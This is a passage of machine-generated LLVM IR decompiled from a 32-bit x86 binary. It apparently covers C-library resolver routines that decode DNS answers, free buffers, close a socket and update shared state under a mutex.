  br i1 %v2_8064e9e84, label %dec_label_pc_8064eaa, label %dec_label_pc_8064ea0.lr.ph

dec_label_pc_8064ea0.lr.ph:                       ; preds = %dec_label_pc_8064d6a
  %v0_8064ea0.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8064ea0

dec_label_pc_8064d76:                             ; preds = %dec_label_pc_8064ea0
  %v1_8064d76 = add i32 %v0_8064d7685, 116
  store i32 %v1_8064d76, i32* %eax.global-to-local, align 4
  %v2_8064d7a = add i32 %v0_8064d7685, -4
  %v3_8064d7a = inttoptr i32 %v2_8064d7a to i32*
  store i32 %v1_8064d76, i32* %v3_8064d7a, align 4
  %v3_8064d7b = load i32, i32* %v3_8064ea0, align 4
  %v5_8064d7b = add i32 %v0_8064d7685, -8
  %v6_8064d7b = inttoptr i32 %v5_8064d7b to i32*
  store i32 %v3_8064d7b, i32* %v6_8064d7b, align 4
  %v0_8064d7f = load i32, i32* @esi, align 4
  %v2_8064d7f = add i32 %v0_8064d7685, -12
  %v3_8064d7f = inttoptr i32 %v2_8064d7f to i32*
  store i32 %v0_8064d7f, i32* %v3_8064d7f, align 4
  %v2_8064d80 = add i32 %v0_8064d7685, -16
  %v3_8064d80 = inttoptr i32 %v2_8064d80 to i32*
  store i32 %v2_806493a, i32* %v3_8064d80, align 4
  %v0_8064d81 = call i32 @__decode_answer()
  store i32 %v0_8064d81, i32* %eax.global-to-local, align 4
  %v1_8064d86 = load i32, i32* @esp, align 4
  %v2_8064d86 = add i32 %v1_8064d86, 68
  %v3_8064d86 = inttoptr i32 %v2_8064d86 to i32*
  store i32 %v0_8064d81, i32* %v3_8064d86, align 4
  %v0_8064d8a = load i32, i32* @esp, align 4
  %v1_8064d8a = add i32 %v0_8064d8a, 16
  %v2_8064d8d = icmp slt i32 %v0_8064d81, 0
  %v1_8064d8f = icmp eq i1 %v2_8064d8d, false
  br i1 %v1_8064d8f, label %dec_label_pc_8064da9, label %dec_label_pc_8064d91

dec_label_pc_8064d91:                             ; preds = %dec_label_pc_8064d76
  %v0_8064d91 = load i32, i32* @ebx, align 4
  %v1_8064d91 = icmp eq i32 %v0_8064d91, 0
  br i1 %v1_8064d91, label %dec_label_pc_8064f3c, label %dec_label_pc_8064d99

dec_label_pc_8064d99:                             ; preds = %dec_label_pc_8064d91
  %v1_8064d99 = add i32 %v0_8064d8a, 100
  %v2_8064d99 = inttoptr i32 %v1_8064d99 to i32*
  %v3_8064d99 = load i32, i32* %v2_8064d99, align 4
  %v4_8064d99 = icmp eq i32 %v3_8064d99, 0
  br i1 %v4_8064d99, label %dec_label_pc_8064f3c, label %dec_label_pc_8064eaa

dec_label_pc_8064da9:                             ; preds = %dec_label_pc_8064d76
  %v1_8064da9 = add i32 %v0_8064d8a, 43
  %v2_8064da9 = inttoptr i32 %v1_8064da9 to i8*
  %v3_8064da9 = load i8, i8* %v2_8064da9, align 1
  %v4_8064da9 = icmp eq i8 %v3_8064da9, 0
  br i1 %v4_8064da9, label %dec_label_pc_8064e4a, label %dec_label_pc_8064db4

dec_label_pc_8064db4:                             ; preds = %dec_label_pc_8064da9
  %v0_8064db4 = load i32, i32* @edi, align 4
  %v1_8064db4 = add i32 %v0_8064db4, 28
  %v2_8064db4 = inttoptr i32 %v1_8064db4 to i32*
  %v3_8064db4 = load i32, i32* %v2_8064db4, align 4
  store i32 %v3_8064db4, i32* %eax.global-to-local, align 4
  %v2_8064db7 = add i32 %v0_8064d8a, 160
  %v3_8064db7 = inttoptr i32 %v2_8064db7 to i32*
  store i32 %v3_8064db4, i32* %v3_8064db7, align 4
  %v0_8064dbe = load i32, i32* @edi, align 4
  %v1_8064dbe = add i32 %v0_8064dbe, 32
  %v2_8064dbe = inttoptr i32 %v1_8064dbe to i32*
  %v3_8064dbe = load i32, i32* %v2_8064dbe, align 4
  store i32 %v3_8064dbe, i32* %eax.global-to-local, align 4
  %v1_8064dc1 = load i32, i32* @esp, align 4
  %v2_8064dc1 = add i32 %v1_8064dc1, 148
  %v3_8064dc1 = inttoptr i32 %v2_8064dc1 to i32*
  store i32 %v3_8064dbe, i32* %v3_8064dc1, align 4
  %v0_8064dc8 = load i32, i32* @edi, align 4
  %v1_8064dc8 = add i32 %v0_8064dc8, 36
  %v2_8064dc8 = inttoptr i32 %v1_8064dc8 to i32*
  %v3_8064dc8 = load i32, i32* %v2_8064dc8, align 4
  store i32 %v3_8064dc8, i32* %eax.global-to-local, align 4
  %v1_8064dcb = load i32, i32* @esp, align 4
  %v2_8064dcb = add i32 %v1_8064dcb, 152
  %v3_8064dcb = inttoptr i32 %v2_8064dcb to i32*
  store i32 %v3_8064dc8, i32* %v3_8064dcb, align 4
  %v0_8064dd2 = load i32, i32* @ecx, align 4
  %v1_8064dd2 = load i32, i32* @esp, align 4
  %v2_8064dd2 = add i32 %v1_8064dd2, -4
  %v3_8064dd2 = inttoptr i32 %v2_8064dd2 to i32*
  store i32 %v0_8064dd2, i32* %v3_8064dd2, align 4
  %v1_8064dd3 = add i32 %v1_8064dd2, -8
  %v2_8064dd3 = inttoptr i32 %v1_8064dd3 to i32*
  store i32 40, i32* %v2_8064dd3, align 4
  %v1_8064dd5 = add i32 %v1_8064dd2, 116
  store i32 %v1_8064dd5, i32* %edx.global-to-local, align 4
  %v2_8064dd9 = add i32 %v1_8064dd2, -12
  %v3_8064dd9 = inttoptr i32 %v2_8064dd9 to i32*
  store i32 %v1_8064dd5, i32* %v3_8064dd9, align 4
  %v0_8064dda = load i32, i32* @edi, align 4
  %v2_8064dda = add i32 %v1_8064dd2, -16
  %v3_8064dda = inttoptr i32 %v2_8064dda to i32*
  store i32 %v0_8064dda, i32* %v3_8064dda, align 4
  %v5_8064ddb = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_80649c8, i32 %v3_8064a27)
  store i32 %v5_8064ddb, i32* %eax.global-to-local, align 4
  %v0_8064de0 = load i32, i32* @edi, align 4
  %v1_8064de0 = add i32 %v0_8064de0, 4
  %v2_8064de0 = inttoptr i32 %v1_8064de0 to i32*
  %v3_8064de0 = load i32, i32* %v2_8064de0, align 4
  store i32 %v3_8064de0, i32* %eax.global-to-local, align 4
  %v0_8064de3 = load i32, i32* @esp, align 4
  %v1_8064de3 = add i32 %v0_8064de3, 16
  %v9_8064de6 = icmp eq i32 %v3_8064de0, 24
  br i1 %v9_8064de6, label %dec_label_pc_8064db4.dec_label_pc_8064e0d_crit_edge, label %dec_label_pc_8064deb

dec_label_pc_8064db4.dec_label_pc_8064e0d_crit_edge: ; preds = %dec_label_pc_8064db4
  %.pre28 = add i32 %v0_8064de3, 260
  %.pre29 = inttoptr i32 %.pre28 to i32*
  %v4_8064e0d.pre = load i32, i32* %.pre29, align 4
  br label %dec_label_pc_8064e0d

dec_label_pc_8064deb:                             ; preds = %dec_label_pc_8064db4
  %v1_8064deb = add i32 %v0_8064de0, 28
  %v2_8064deb = inttoptr i32 %v1_8064deb to i32*
  %v3_8064deb = load i32, i32* %v2_8064deb, align 4
  %v4_8064deb = icmp eq i32 %v3_8064deb, 0
  br i1 %v4_8064deb, label %dec_label_pc_8064eaa, label %dec_label_pc_8064df5

dec_label_pc_8064df5:                             ; preds = %dec_label_pc_8064deb
  %v1_8064df5 = add i32 %v0_8064de3, 260
  %v2_8064df5 = inttoptr i32 %v1_8064df5 to i32*
  %v3_8064df5 = load i32, i32* %v2_8064df5, align 4
  %v12_8064df5 = icmp eq i32 %v3_8064df5, 1
  br i1 %v12_8064df5, label %dec_label_pc_8064e0d, label %dec_label_pc_8064dff

dec_label_pc_8064dff:                             ; preds = %dec_label_pc_8064df5
  %v12_8064dff = icmp eq i32 %v3_8064df5, 28
  %v1_8064e07 = icmp eq i1 %v12_8064dff, false
  br i1 %v1_8064e07, label %dec_label_pc_8064eaa, label %dec_label_pc_8064e0d

dec_label_pc_8064e0d:                             ; preds = %dec_label_pc_8064db4.dec_label_pc_8064e0d_crit_edge, %dec_label_pc_8064dff, %dec_label_pc_8064df5
  %v4_8064e0d = phi i32 [ %v4_8064e0d.pre, %dec_label_pc_8064db4.dec_label_pc_8064e0d_crit_edge ], [ %v3_8064df5, %dec_label_pc_8064dff ], [ 1, %dec_label_pc_8064df5 ]
  %v15_8064e0d = icmp eq i32 %v3_8064de0, %v4_8064e0d
  br i1 %v15_8064e0d, label %dec_label_pc_8064e22, label %dec_label_pc_8064e16

dec_label_pc_8064e16:                             ; preds = %dec_label_pc_8064e0d
  %v1_8064e19 = inttoptr i32 %v0_8064de0 to i32*
  %v2_8064e19 = load i32, i32* %v1_8064e19, align 4
  %v5_8064e19 = inttoptr i32 %v0_8064de3 to i32*
  store i32 %v2_8064e19, i32* %v5_8064e19, align 4
  %v1_8064e1b = call i32 @free(i32 -1)
  store i32 %v1_8064e1b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064e92

dec_label_pc_8064e22:                             ; preds = %dec_label_pc_8064e0d
  %v0_8064e22 = load i32, i32* @ebx, align 4
  %v1_8064e24 = sub i32 -1, %v0_8064e22
  store i32 %v1_8064e24, i32* %eax.global-to-local, align 4
  %v2_8064e26 = add i32 %v0_8064de3, 120
  %v3_8064e26 = inttoptr i32 %v2_8064e26 to i32*
  %v4_8064e26 = load i32, i32* %v3_8064e26, align 4
  %v5_8064e26 = add i32 %v4_8064e26, %v1_8064e24
  store i32 %v5_8064e26, i32* %eax.global-to-local, align 4
  %v2_8064e2a = add i32 %v0_8064de0, 36
  %v3_8064e2a = inttoptr i32 %v2_8064e2a to i32*
  store i32 %v5_8064e26, i32* %v3_8064e2a, align 4
  %v0_8064e2d = load i32, i32* @edi, align 4
  %v1_8064e2d = add i32 %v0_8064e2d, 16
  %v2_8064e2d = inttoptr i32 %v1_8064e2d to i32*
  %v3_8064e2d = load i32, i32* %v2_8064e2d, align 4
  %v1_8064e30 = add i32 %v3_8064e2d, 4
  store i32 %v1_8064e30, i32* %eax.global-to-local, align 4
  %v2_8064e33 = add i32 %v0_8064e2d, 36
  %v3_8064e33 = inttoptr i32 %v2_8064e33 to i32*
  %v4_8064e33 = load i32, i32* %v3_8064e33, align 4
  %v7_8064e33 = mul i32 %v4_8064e33, %v1_8064e30
  store i32 %v7_8064e33, i32* %eax.global-to-local, align 4
  %v2_8064e37 = add i32 %v0_8064e2d, 32
  %v3_8064e37 = inttoptr i32 %v2_8064e37 to i32*
  %v4_8064e37 = load i32, i32* %v3_8064e37, align 4
  %v6_8064e3a = icmp ugt i32 %v7_8064e33, %v4_8064e37
  br i1 %v6_8064e3a, label %dec_label_pc_8064e22.dec_label_pc_8064eaa.loopexit_crit_edge, label %dec_label_pc_8064e3c

dec_label_pc_8064e22.dec_label_pc_8064eaa.loopexit_crit_edge: ; preds = %dec_label_pc_8064e22
  %v0_8064eaa.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8064eaa

dec_label_pc_8064e3c:                             ; preds = %dec_label_pc_8064e22
  store i32 0, i32* %v3_8064e33, align 4
  %v0_8064e43 = load i32, i32* @esp, align 4
  %v1_8064e43 = add i32 %v0_8064e43, 27
  %v2_8064e43 = inttoptr i32 %v1_8064e43 to i8*
  store i8 0, i8* %v2_8064e43, align 1
  %v1_8064e95.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8064e95

dec_label_pc_8064e4a:                             ; preds = %dec_label_pc_8064da9
  %v1_8064e4d = add i32 %v0_8064d8a, 132
  %v2_8064e4d = inttoptr i32 %v1_8064e4d to i32*
  %v3_8064e4d = load i32, i32* %v2_8064e4d, align 4
  %v6_8064e4d = inttoptr i32 %v0_8064d8a to i32*
  store i32 %v3_8064e4d, i32* %v6_8064e4d, align 4
  %v1_8064e54 = call i32 @free(i32 -1)
  store i32 %v1_8064e54, i32* %eax.global-to-local, align 4
  %v0_8064e59 = load i32, i32* @esp, align 4
  %v1_8064e59 = add i32 %v0_8064e59, 16
  %v1_8064e5c = add i32 %v0_8064e59, 260
  %v2_8064e5c = inttoptr i32 %v1_8064e5c to i32*
  %v3_8064e5c = load i32, i32* %v2_8064e5c, align 4
  store i32 %v3_8064e5c, i32* %eax.global-to-local, align 4
  %v1_8064e63 = add i32 %v0_8064e59, 136
  %v2_8064e63 = inttoptr i32 %v1_8064e63 to i32*
  %v3_8064e63 = load i32, i32* %v2_8064e63, align 4
  %v15_8064e63 = icmp eq i32 %v3_8064e63, %v3_8064e5c
  %v1_8064e67 = icmp eq i1 %v15_8064e63, false
  br i1 %v1_8064e67, label %dec_label_pc_8064e95, label %dec_label_pc_8064e69

dec_label_pc_8064e69:                             ; preds = %dec_label_pc_8064e4a
  %v0_8064e69 = load i32, i32* @edi, align 4
  %v1_8064e69 = add i32 %v0_8064e69, 16
  %v2_8064e69 = inttoptr i32 %v1_8064e69 to i32*
  %v3_8064e69 = load i32, i32* %v2_8064e69, align 4
  store i32 %v3_8064e69, i32* %eax.global-to-local, align 4
  %v2_8064e6c = add i32 %v0_8064e59, 148
  %v3_8064e6c = inttoptr i32 %v2_8064e6c to i32*
  %v4_8064e6c = load i32, i32* %v3_8064e6c, align 4
  %v15_8064e6c = icmp eq i32 %v3_8064e69, %v4_8064e6c
  %v1_8064e73 = icmp eq i1 %v15_8064e6c, false
  br i1 %v1_8064e73, label %dec_label_pc_8064f2f, label %dec_label_pc_8064e79

dec_label_pc_8064e79:                             ; preds = %dec_label_pc_8064e69
  %v0_8064e79 = load i32, i32* @edx, align 4
  %v2_8064e79 = add i32 %v0_8064e59, 12
  %v3_8064e79 = inttoptr i32 %v2_8064e79 to i32*
  store i32 %v0_8064e79, i32* %v3_8064e79, align 4
  %v0_8064e7a = load i32, i32* %eax.global-to-local, align 4
  %v2_8064e7a = add i32 %v0_8064e59, 8
  %v3_8064e7a = inttoptr i32 %v2_8064e7a to i32*
  store i32 %v0_8064e7a, i32* %v3_8064e7a, align 4
  %v1_8064e7b = add i32 %v0_8064e59, 152
  %v2_8064e7b = inttoptr i32 %v1_8064e7b to i32*
  %v3_8064e7b = load i32, i32* %v2_8064e7b, align 4
  %v5_8064e7b = add i32 %v0_8064e59, 4
  %v6_8064e7b = inttoptr i32 %v5_8064e7b to i32*
  store i32 %v3_8064e7b, i32* %v6_8064e7b, align 4
  %v0_8064e82 = load i32, i32* %eax.global-to-local, align 4
  %v1_8064e82 = load i32, i32* @edi, align 4
  %v2_8064e82 = add i32 %v1_8064e82, 36
  %v3_8064e82 = inttoptr i32 %v2_8064e82 to i32*
  %v4_8064e82 = load i32, i32* %v3_8064e82, align 4
  %v7_8064e82 = mul i32 %v4_8064e82, %v0_8064e82
  store i32 %v7_8064e82, i32* %eax.global-to-local, align 4
  %v2_8064e86 = add i32 %v1_8064e82, 28
  %v3_8064e86 = inttoptr i32 %v2_8064e86 to i32*
  %v4_8064e86 = load i32, i32* %v3_8064e86, align 4
  %v5_8064e86 = add i32 %v4_8064e86, %v7_8064e82
  store i32 %v5_8064e86, i32* %eax.global-to-local, align 4
  %v3_8064e89 = inttoptr i32 %v0_8064e59 to i32*
  store i32 %v5_8064e86, i32* %v3_8064e89, align 4
  %v5_8064e8a = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_80649c8, i32 %v3_8064a27)
  store i32 %v5_8064e8a, i32* %eax.global-to-local, align 4
  %v0_8064e8f = load i32, i32* @edi, align 4
  %v1_8064e8f = add i32 %v0_8064e8f, 36
  %v2_8064e8f = inttoptr i32 %v1_8064e8f to i32*
  %v3_8064e8f = load i32, i32* %v2_8064e8f, align 4
  %v4_8064e8f = add i32 %v3_8064e8f, 1
  store i32 %v4_8064e8f, i32* %v2_8064e8f, align 4
  br label %dec_label_pc_8064e92

dec_label_pc_8064e92:                             ; preds = %dec_label_pc_8064e16, %dec_label_pc_8064e79
  %v0_8064e92 = load i32, i32* @esp, align 4
  %v1_8064e92 = add i32 %v0_8064e92, 16
  br label %dec_label_pc_8064e95

dec_label_pc_8064e95:                             ; preds = %dec_label_pc_8064e4a, %dec_label_pc_8064e3c, %dec_label_pc_8064e92
  %v1_8064e95 = phi i32 [ %v1_8064e59, %dec_label_pc_8064e4a ], [ %v1_8064e95.pre, %dec_label_pc_8064e3c ], [ %v1_8064e92, %dec_label_pc_8064e92 ]
  %v0_8064e95 = load i32, i32* @esi, align 4
  %v2_8064e95 = add i32 %v1_8064e95, 52
  %v3_8064e95 = inttoptr i32 %v2_8064e95 to i32*
  %v4_8064e95 = load i32, i32* %v3_8064e95, align 4
  %v5_8064e95 = add i32 %v4_8064e95, %v0_8064e95
  store i32 %v5_8064e95, i32* @esi, align 4
  %v0_8064e99 = load i32, i32* @ebx, align 4
  %v1_8064e99 = add i32 %v0_8064e99, 1
  store i32 %v1_8064e99, i32* @ebx, align 4
  %v2_8064e9a = add i32 %v1_8064e95, 104
  %v3_8064e9a = inttoptr i32 %v2_8064e9a to i32*
  %v4_8064e9a = load i32, i32* %v3_8064e9a, align 4
  %v5_8064e9a = sub i32 %v1_8064e99, %v4_8064e9a
  %v11_8064e9a = xor i32 %v4_8064e9a, %v1_8064e99
  %v12_8064e9a = xor i32 %v5_8064e9a, %v1_8064e99
  %v13_8064e9a = and i32 %v12_8064e9a, %v11_8064e9a
  %v14_8064e9a = icmp slt i32 %v13_8064e9a, 0
  %v16_8064e9a = icmp slt i32 %v5_8064e9a, 0
  %v2_8064e9e = icmp eq i1 %v16_8064e9a, %v14_8064e9a
  br i1 %v2_8064e9e, label %dec_label_pc_8064eaa, label %dec_label_pc_8064ea0

dec_label_pc_8064ea0:                             ; preds = %dec_label_pc_8064ea0.lr.ph, %dec_label_pc_8064e95
  %v0_8064ea0 = phi i32 [ %v0_8064ea0.pre, %dec_label_pc_8064ea0.lr.ph ], [ %v5_8064e95, %dec_label_pc_8064e95 ]
  %v0_8064d7685 = phi i32 [ %v1_8064e9a.pre, %dec_label_pc_8064ea0.lr.ph ], [ %v1_8064e95, %dec_label_pc_8064e95 ]
  %v2_8064ea0 = add i32 %v0_8064d7685, 16
  %v3_8064ea0 = inttoptr i32 %v2_8064ea0 to i32*
  %v4_8064ea0 = load i32, i32* %v3_8064ea0, align 4
  %v5_8064ea0 = sub i32 %v0_8064ea0, %v4_8064ea0
  %v11_8064ea0 = xor i32 %v4_8064ea0, %v0_8064ea0
  %v12_8064ea0 = xor i32 %v5_8064ea0, %v0_8064ea0
  %v13_8064ea0 = and i32 %v12_8064ea0, %v11_8064ea0
  %v14_8064ea0 = icmp slt i32 %v13_8064ea0, 0
  %v16_8064ea0 = icmp slt i32 %v5_8064ea0, 0
  %v2_8064ea4 = icmp eq i1 %v16_8064ea0, %v14_8064ea0
  br i1 %v2_8064ea4, label %dec_label_pc_8064eaa, label %dec_label_pc_8064d76

dec_label_pc_8064eaa:                             ; preds = %dec_label_pc_8064d99, %dec_label_pc_8064d6a, %dec_label_pc_8064e95, %dec_label_pc_8064deb, %dec_label_pc_8064dff, %dec_label_pc_8064ea0, %dec_label_pc_8064e22.dec_label_pc_8064eaa.loopexit_crit_edge
  %v0_8064eaa = phi i32 [ %v0_8064eaa.pre.pre, %dec_label_pc_8064e22.dec_label_pc_8064eaa.loopexit_crit_edge ], [ %v1_8064e9a.pre, %dec_label_pc_8064d6a ], [ %v1_8064e95, %dec_label_pc_8064e95 ], [ %v1_8064de3, %dec_label_pc_8064deb ], [ %v1_8064de3, %dec_label_pc_8064dff ], [ %v0_8064d7685, %dec_label_pc_8064ea0 ], [ %v1_8064d8a, %dec_label_pc_8064d99 ]
  %v1_8064ead = add i32 %v0_8064eaa, 20
  %v2_8064ead = inttoptr i32 %v1_8064ead to i32*
  %v3_8064ead = load i32, i32* %v2_8064ead, align 4
  %v5_8064ead = add i32 %v0_8064eaa, -16
  %v6_8064ead = inttoptr i32 %v5_8064ead to i32*
  store i32 %v3_8064ead, i32* %v6_8064ead, align 4
  %v1_8064eb1 = call i32 @__libc_close(i32 -1)
  store i32 %v1_8064eb1, i32* %eax.global-to-local, align 4
  %v0_8064eb6 = load i32, i32* @esp, align 4
  %v1_8064eb9 = add i32 %v0_8064eb6, 272
  %v2_8064eb9 = inttoptr i32 %v1_8064eb9 to i32*
  %v3_8064eb9 = load i32, i32* %v2_8064eb9, align 4
  %v4_8064eb9 = icmp eq i32 %v3_8064eb9, 0
  br i1 %v4_8064eb9, label %dec_label_pc_8064ece, label %dec_label_pc_8064ec3

dec_label_pc_8064ec3:                             ; preds = %dec_label_pc_8064eaa
  store i32 %v3_8064eb9, i32* %edx.global-to-local, align 4
  %v2_8064eca = inttoptr i32 %v3_8064eb9 to i32*
  store i32 %v2_806493a, i32* %v2_8064eca, align 4
  %v0_8064eda.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8064eda

dec_label_pc_8064ece:                             ; preds = %dec_label_pc_8064eaa
  %v3_8064ed1 = inttoptr i32 %v0_8064eb6 to i32*
  store i32 %v2_806493a, i32* %v3_8064ed1, align 4
  %v1_8064ed2 = call i32 @free(i32 -1)
  store i32 %v1_8064ed2, i32* %eax.global-to-local, align 4
  %v0_8064ed7 = load i32, i32* @esp, align 4
  %v1_8064ed7 = add i32 %v0_8064ed7, 16
  br label %dec_label_pc_8064eda

dec_label_pc_8064eda:                             ; preds = %dec_label_pc_8064ec3, %dec_label_pc_8064ece
  %v0_8064eda = phi i32 [ %v0_8064eda.pre, %dec_label_pc_8064ec3 ], [ %v1_8064ed7, %dec_label_pc_8064ece ]
  %v1_8064edd = add i32 %v0_8064eda, 12
  %v2_8064edd = inttoptr i32 %v1_8064edd to i32*
  %v3_8064edd = load i32, i32* %v2_8064edd, align 4
  %v5_8064edd = add i32 %v0_8064eda, -16
  %v6_8064edd = inttoptr i32 %v5_8064edd to i32*
  store i32 %v3_8064edd, i32* %v6_8064edd, align 4
  %v1_8064ee1 = call i32 @free(i32 -1)
  store i32 %v1_8064ee1, i32* %eax.global-to-local, align 4
  %v0_8064ee6 = load i32, i32* @esp, align 4
  %v1_8064ee9 = add i32 %v0_8064ee6, 8
  %v2_8064ee9 = inttoptr i32 %v1_8064ee9 to i32*
  store i32 ptrtoint (i8** @global_var_807d27c.822 to i32), i32* %v2_8064ee9, align 4
  %v1_8064eee = add i32 %v0_8064ee6, 4
  %v2_8064eee = inttoptr i32 %v1_8064eee to i32*
  store i32 134585853, i32* %v2_8064eee, align 4
  %v1_8064ef3 = add i32 %v0_8064ee6, 200
  store i32 %v1_8064ef3, i32* @ebx, align 4
  %v3_8064efa = inttoptr i32 %v0_8064ee6 to i32*
  store i32 %v1_8064ef3, i32* %v3_8064efa, align 4
  %v5_8064efb = call i32 @__pthread_cleanup_push_defer(i32* inttoptr (i32 -1 to i32*), i32 %v15_80649c8, i32 %v3_8064a27)
  store i32 %v5_8064efb, i32* %eax.global-to-local, align 4
  %v0_8064f00 = load i32, i32* @esp, align 4
  %v1_8064f00 = inttoptr i32 %v0_8064f00 to i32*
  store i32 ptrtoint (i8** @global_var_807d27c.822 to i32), i32* %v1_8064f00, align 4
  %v1_8064f07 = call i32 @pthread_mutex_lock(i32 -1)
  store i32 %v1_8064f07, i32* %eax.global-to-local, align 4
  %v0_8064f0c = load i32, i32* @esp, align 4
  %v1_8064f0c = add i32 %v0_8064f0c, 56
  %v2_8064f0c = inttoptr i32 %v1_8064f0c to i32*
  %v3_8064f0c = load i32, i32* %v2_8064f0c, align 4
  store i32 %v3_8064f0c, i32* %eax.global-to-local, align 4
  %v1_8064f10 = add i32 %v0_8064f0c, 72
  %v2_8064f10 = inttoptr i32 %v1_8064f10 to i32*
  %v3_8064f10 = load i32, i32* %v2_8064f10, align 4
  store i32 %v3_8064f10, i32* %edx.global-to-local, align 4
  %v1_8064f14 = inttoptr i32 %v0_8064f0c to i32*
  %v3_8064f14 = add i32 %v0_8064f0c, 4
  %v1_8064f15 = inttoptr i32 %v3_8064f14 to i32*
  store i32 1, i32* %v1_8064f15, align 4
  %v0_8064f18 = load i32, i32* %eax.global-to-local, align 4
  %v1_8064f18 = sext i32 %v0_8064f18 to i64
  store i64 %v1_8064f18, i64* @global_var_807d294.823, align 8
  %v0_8064f1d = load i32, i32* %edx.global-to-local, align 4
  %v1_8064f1d = trunc i32 %v0_8064f1d to i16
  store i16 %v1_8064f1d, i16* @global_var_807489c.824, align 4
  %v0_8064f24 = load i32, i32* @ebx, align 4
  store i32 %v0_8064f24, i32* %v1_8064f14, align 4
  %v3_8064f25 = call i32 @__pthread_cleanup_pop_restore(i32* inttoptr (i32 -1 to i32*), i32 %v15_80649c8)
  store i32 %v3_8064f25, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065066

dec_label_pc_8064f2f:                             ; preds = %dec_label_pc_8064e69
  %v1_8064f32 = inttoptr i32 %v0_8064e69 to i32*
  %v2_8064f32 = load i32, i32* %v1_8064f32, align 4
  %v5_8064f32 = inttoptr i32 %v0_8064e59 to i32*
  store i32 %v2_8064f32, i32* %v5_8064f32, align 4
  %v1_8064f34 = call i32 @free(i32 -1)
  store i32 %v1_8064f34, i32* %eax.global-to-local, align 4
  %v0_8064f39 = load i32, i32* @esp, align 4
  %v1_8064f39 = add i32 %v0_8064f39, 16
  br label %dec_label_pc_8064f3c

dec_label_pc_8064f3c:                             ; preds = %dec_label_pc_8064c6e, %dec_label_pc_8064d99, %dec_label_pc_8064d91, %dec_label_pc_8064d2d, %dec_label_pc_8064cb3, %dec_label_pc_8064c8f, %dec_label_pc_8064f2f
  %v1_8064f43 = phi i32 [ %v1_8064c83, %dec_label_pc_8064c6e ], [ %v1_8064d8a, %dec_label_pc_8064d99 ], [ %v1_8064d8a, %dec_label_pc_8064d91 ], [ %v1_8064ca4, %dec_label_pc_8064d2d ], [ %v1_8064ca4, %dec_label_pc_8064cb3 ], [ %v1_8064ca4, %dec_label_pc_8064c8f ], [ %v1_8064f39, %dec_label_pc_8064f2f ]
  %v1_8064f3c = add i32 %v1_8064f43, 51
  %v2_8064f3c = inttoptr i32 %v1_8064f3c to i8*
  %v3_8064f3c = load i8, i8* %v2_8064f3c, align 1
  %v4_8064f3c = icmp eq i8 %v3_8064f3c, 0
  %v1_8064f41 = icmp eq i1 %v4_8064f3c, false
  br i1 %v1_8064f41, label %dec_label_pc_8064f87, label %dec_label_pc_8064f43

dec_label_pc_8064f43:                             ; preds = %dec_label_pc_8064f3c
  %v0_8064f43 = load i32, i32* @ecx, align 4
  %v2_8064f43 = add i32 %v1_8064f43, -4
  %v3_8064f43 = inttoptr i32 %v2_8064f43 to i32*
  store i32 %v0_8064f43, i32* %v3_8064f43, align 4
  %v1_8064f44 = add i32 %v1_8064f43, -8
  %v2_8064f44 = inttoptr i32 %v1_8064f44 to i32*
  store i32 ptrtoint (i32* @global_var_80748a0.725 to i32), i32* %v2_8064f44, align 4
  %v1_8064f49 = add i32 %v1_8064f43, -12
  %v2_8064f49 = inttoptr i32 %v1_8064f49 to i32*
  store i32 134585853, i32* %v2_8064f49, align 4
  %v1_8064f4e = add i32 %v1_8064f43, 184
  store i32 %v1_8064f4e, i32* @esi, align 4
  %v2_8064f55 = add i32 %v1_8064f43, -16
  %v3_8064f55 = inttoptr i32 %v2_8064f55 to i32*
  store i32 %v1_8064f4e, i32* %v3_8064f55, align 4
  %v5_8064f56 = call i32 @__pthread_cleanup_push_defer(i32* inttoptr (i32 -1 to i32*), i32 %v15_80649c8, i32 %v3_8064a27)
  store i32 %v5_8064f56, i32* %eax.global-to-local, align 4
  %v0_8064f5b = load i32, i32* @esp, align 4
  %v1_8064f5b = inttoptr i32 %v0_8064f5b to i32*
  store i32 ptrtoint (i32* @global_var_80748a0.725 to i32), i32* %v1_8064f5b, align 4
  %v1_8064f62 = call i32 @pthread_mutex_lock(i32 -1)
  store i32 %v1_8064f62, i32* %eax.global-to-local, align 4
  %v0_8064f67 = load i32, i32* @esp, align 4
  %v1_8064f67 = inttoptr i32 %v0_8064f67 to i32*
  %v2_8064f67 = load i32, i32* %v1_8064f67, align 4
  store i32 %v2_8064f67, i32* %eax.global-to-local, align 4
  %v3_8064f67 = add i32 %v0_8064f67, 4
  %v1_8064f68 = inttoptr i32 %v3_8064f67 to i32*
  %v2_8064f68 = load i32, i32* %v1_8064f68, align 4
  store i32 %v2_8064f68, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8064f68, align 4
  %v0_8064f6b = load i32, i32* @esi, align 4
  store i32 %v0_8064f6b, i32* %v1_8064f67, align 4
  %v0_8064f6c = load i32, i32* @global_var_807ea64.825, align 4
  store i32 %v0_8064f6c, i32* @ebx, align 4
  %v3_8064f72 = call i32 @__pthread_cleanup_pop_restore(i32* inttoptr (i32 -1 to i32*), i32 %v15_80649c8)
  store i32 %v3_8064f72, i32* %eax.global-to-local, align 4
  %v0_8064f77 = load i32, i32* @esp, align 4
  %v1_8064f77 = add i32 %v0_8064f77, 16
  %v0_8064f7a = load i32, i32* @ebx, align 4
  %v1_8064f7a = add i32 %v0_8064f7a, -1
  store i32 %v1_8064f7a, i32* @ebx, align 4
  %v1_8064f7b = add i32 %v0_8064f77, 52
  %v2_8064f7b = inttoptr i32 %v1_8064f7b to i32*
  %v3_8064f7b = load i32, i32* %v2_8064f7b, align 4
  %v5_8064f7b = sub i32 %v3_8064f7b, %v1_8064f7a
  %v11_8064f7b = xor i32 %v3_8064f7b, %v1_8064f7a
  %v12_8064f7b = xor i32 %v5_8064f7b, %v3_8064f7b
  %v13_8064f7b = and i32 %v12_8064f7b, %v11_8064f7b
  %v14_8064f7b = icmp slt i32 %v13_8064f7b, 0
  %v16_8064f7b = icmp slt i32 %v5_8064f7b, 0
  %v2_8064f7f = icmp eq i1 %v16_8064f7b, %v14_8064f7b
  br i1 %v2_8064f7f, label %dec_label_pc_8064f87, label %dec_label_pc_8064f81

